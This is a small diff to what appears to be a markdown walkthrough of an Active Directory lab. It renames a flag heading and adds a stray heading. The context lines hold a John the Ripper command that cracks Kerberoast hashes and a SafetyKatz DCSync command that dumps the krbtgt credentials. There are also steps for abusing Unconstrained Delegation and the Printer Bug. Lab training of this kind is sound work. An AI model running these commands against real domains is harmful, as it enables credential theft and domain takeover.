@@ -599,7 +599,7 @@ Crack it with john
 C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
 ```
 
-### **FLAG 24 - Domain user who is a local admin on dcorp-appsrv**
+### **FLAG 24/25 - Domain user who is a local admin on dcorp-appsrv**
 - Find a server in the dcorp domain where Unconstrained Delegation is enabled. 
 - Compromise the server and escalate to Domain Admin privileges. 
 - Escalate to Enterprise Admins privileges by abusing Printer Bug!
@@ -686,3 +686,5 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp
 
 
 
+
+### **titolo**
